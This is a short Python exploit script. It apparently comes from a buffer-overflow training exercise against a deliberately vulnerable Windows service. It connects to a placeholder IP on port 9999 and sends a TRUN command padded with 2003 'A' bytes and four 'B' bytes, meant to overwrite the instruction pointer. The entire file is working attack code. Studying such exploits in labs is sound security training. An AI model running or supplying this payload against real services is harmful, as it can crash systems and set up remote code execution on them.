#!/usr/bin/python3
import socket
import sys

ip = "WINDOWS_IP" #CHANGE THIS 
port = 9999

payload = b"A" * 2003 + b"B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b"TRUN /.:/" + payload + b"\r\n")
    s.close()
    print("[+] Payload sent")

except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit()

